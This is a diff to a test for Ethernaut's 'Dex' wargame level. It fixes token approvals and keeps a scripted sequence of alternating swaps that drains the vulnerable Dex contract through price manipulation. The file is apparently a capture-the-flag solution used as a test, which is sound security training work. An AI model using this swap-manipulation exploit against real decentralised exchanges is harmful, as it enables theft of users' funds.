@@ -1,6 +1,6 @@
 const Ethernaut = artifacts.require('./Ethernaut.sol')
 const DexFactory = artifacts.require('./levels/DexFactory.sol')
-const SwappableToken = artifacts.require('SwappableToken');
+const SwappableToken = artifacts.require('SwappableToken')
 const Dex = artifacts.require('./levels/Dex.sol')
 const { BN, constants, expectEvent, expectRevert } = require('openzeppelin-test-helpers')
 const utils = require('../utils/TestUtils')
@@ -39,7 +39,8 @@ contract('Dex', function (accounts) {
         assert.equal(token_two_balance, 100)
 
         // Start swapping
-        await instance.approve(instance.address, 10, { from: player })
+        await token1.approve(instance.address, 200, { from: player })
+        await token2.approve(instance.address, 200, { from: player })
         await instance.swap(token1.address, token2.address, 10, { from: player })
         token_one_balance = await token1.balanceOf(instance.address)
         token_two_balance = await token2.balanceOf(instance.address)
@@ -47,15 +48,10 @@ contract('Dex', function (accounts) {
         player_balance_1 = await token1.balanceOf(player)
         player_balance_2 = await token2.balanceOf(player)
         console.log(`Balances of player are ${player_balance_1}, ${player_balance_2}`)
-        await instance.approve(instance.address, 20, { from: player })
         await instance.swap(token2.address, token1.address, 20, { from: player })
-        await instance.approve(instance.address, 24, { from: player })
         await instance.swap(token1.address, token2.address, 24, { from: player })
-        await instance.approve(instance.address, 30, { from: player })
         await instance.swap(token2.address, token1.address, 30, { from: player })
-        await instance.approve(instance.address, 41, { from: player })
         await instance.swap(token1.address, token2.address, 41, { from: player })
-        await instance.approve(instance.address, 45, { from: player })
         await instance.swap(token2.address, token1.address, 45, { from: player })
         token_one_balance = await token1.balanceOf(instance.address)
         token_two_balance = await token2.balanceOf(instance.address)
